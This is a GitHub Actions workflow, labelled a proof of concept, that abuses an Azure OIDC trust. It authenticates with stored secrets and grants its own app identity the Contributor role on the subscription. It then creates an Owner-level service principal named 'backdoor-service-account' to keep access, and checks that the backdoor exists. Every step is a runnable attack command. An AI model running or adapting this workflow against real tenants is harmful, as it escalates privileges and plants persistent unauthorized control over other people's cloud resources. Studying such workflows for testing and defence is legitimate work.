name: Azure OIDC Trust Abuse POC
on: workflow_dispatch
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - name: Authenticate via OIDC
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.APP_CLIENT_ID }}
          tenant-id: ${{ secrets.TENANT_ID }}
          subscription-id: ${{ secrets.SUBSCRIPTION_ID }}

      - name: Verify initial access
        run: az group list --output table

      - name: Demonstrate privilege escalation
        run: |
          az role assignment create \
            --assignee ${{ secrets.APP_CLIENT_ID }} \
            --role "Contributor" \
            --scope /subscriptions/${{ secrets.SUBSCRIPTION_ID }}

      - name: Demonstrate persistence via new identity
        run: |
          az ad sp create-for-rbac \
            --name "backdoor-service-account" \
            --role "Owner" \
            --scopes /subscriptions/${{ secrets.SUBSCRIPTION_ID }}

      - name: Verify persistence
        run: az ad sp list --display-name "backdoor-service-account" --output table
